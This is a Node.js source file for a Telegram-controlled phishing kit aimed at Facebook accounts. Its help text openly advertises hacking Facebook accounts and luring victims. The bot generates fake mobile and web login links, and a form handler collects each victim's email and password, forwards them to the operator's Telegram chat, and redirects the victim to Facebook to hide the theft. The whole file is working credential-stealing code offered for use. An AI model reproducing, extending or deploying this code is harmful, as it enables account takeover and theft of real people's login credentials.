// Import required modules
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// Initialize Express app and set port
const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const { botToken, hostURL } = require('./config');
const bot = new TelegramBot(botToken, { polling: true });

// Set the view engine to EJS
app.set('view engine', 'ejs');

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Object to store user data
const users = {};

// Handle /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  users[chatId] = {}; // Initialize user data
  const welcomeMessage = 'Welcome to the login bot! \n\nHere are some options:\n/create - Generate the login URL\n/help - Get assistance or information';
  bot.sendMessage(chatId, welcomeMessage);
});

// Handle /create command
bot.onText(/\/create/, (msg) => {
  const chatId = msg.chat.id;
  if (!users[chatId]) {
    bot.sendMessage(chatId, 'Please send /start first to start the bot properly.');
    return;
  }
  users[chatId].isWaitingForURL = true;
  bot.sendMessage(chatId, '🌐 Enter Your URL');
});

// Handle user messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (users[chatId] && users[chatId].isWaitingForURL) {
    if (messageText.startsWith('https://')) {
      users[chatId].userRedirectUrl = messageText;
    }

    const uniqueURLMobile = `${hostURL}/mobile/${chatId}`;
    const uniqueURLWeb = `${hostURL}/web/${chatId}`;
    const replyMessage = `<b>🌐Mobile login URL:</b> <a href="${uniqueURLMobile}" target="_blank" style="color: blue; text-decoration: underline;">${uniqueURLMobile}</a>\n<b>🌐Web login URL:</b> <a href="${uniqueURLWeb}" target="_blank" style="color: green; font-weight: bold;">${uniqueURLWeb}</a>`;

    // Send the reply message with or without the redirect URL
    bot.sendMessage(chatId, replyMessage, { parse_mode: 'HTML' });

    // Reset the waiting state
    users[chatId].isWaitingForURL = false;
  }
});

// Handle /help command
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Through this bot you can hack facebok account just by sending a simple link.\n\nSend /create to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the url it will send you 2 links which you can use to hack Facebook account.\n\nThe project is OSS at: https://github.com/TheBwof/fbtelephish ');
});

// Render mobile page
app.get('/mobile/:chatId', (req, res) => {
  const chatId = req.params.chatId;
  res.render('mobile', { chatId });
});

// Render web page
app.get('/web/:chatId', (req, res) => {
  const chatId = req.params.chatId;
  res.render('web', { chatId });
});

// Handle form submission
app.post('/submit/:chatId', (req, res) => {
  const chatId = req.params.chatId;
  const { email, pass } = req.body;

  if (users[chatId]) {
    const message = `New login attempt:\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}\n<b>Safeguard your login details for account security.</b>`;
    bot.sendMessage(chatId, message, { parse_mode: 'HTML' })
      .then(() => {
        // Redirect to stored URL after sending data to the bot
        res.redirect(users[chatId].userRedirectUrl || 'https://www.facebook.com/login/identify'); // Use stored URL or default URL
      })
      .catch((error) => {
        console.error('Error sending message to Telegram:', error);
        res.status(500).send('Error sending message to Telegram');
      });
  } else {
    res.status(400).send('Incorrect Submitted Data.');
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
